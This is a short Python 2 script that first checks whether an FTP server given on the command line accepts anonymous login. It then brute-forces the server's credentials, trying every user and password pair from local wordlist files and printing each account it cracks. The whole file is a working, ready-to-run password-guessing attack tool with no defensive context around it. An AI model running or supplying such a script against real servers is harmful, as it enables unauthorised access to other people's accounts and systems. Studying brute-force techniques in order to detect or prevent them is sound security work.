#!/usr/bin/python

import sys
import ftplib

def anonFTP(hostname):
  try:
    ftp = ftplib.FTP(hostname)
    ftp.login('anonymous', 'test@test.com')
    ftp.quit()
    return True 
  except Exception, e:
    return False

def ftp_brute(hostname, user, password):
  try:
    ftp = ftplib.FTP(hostname)
    ftp.login(user, password)
    ftp.quit()
    return True
  except Exception, e:
    return False


ftpsvr = sys.argv[1]

print ftpsvr + ": Checking anonymous FTP server status"
ftp_result = anonFTP(ftpsvr)
if ftp_result is not False:
  print "[+] " + ftpsvr + " IS an anonymous FTP server"
else:
  print "[-] " + ftpsvr + " is either offline or not an FTP server"
  
  # Brute forcing
print "\n" + ftpsvr + ": Brute forcing FTP server..."
userlistfile = open("userlist", "r")
for user in userlistfile.readlines():
  passlistfile = open("passlist", "r")
  for password in passlistfile.readlines():
    # strip trailing new lines
    user = user.rstrip()
    password = password.rstrip()
    print "[.] Trying user: " + user + " password: " + password
    brute_result = ftp_brute(ftpsvr, user, password)
    if brute_result == True:
      print "[+] FOUND ACCOUNT User: " + user + " Password: " + password
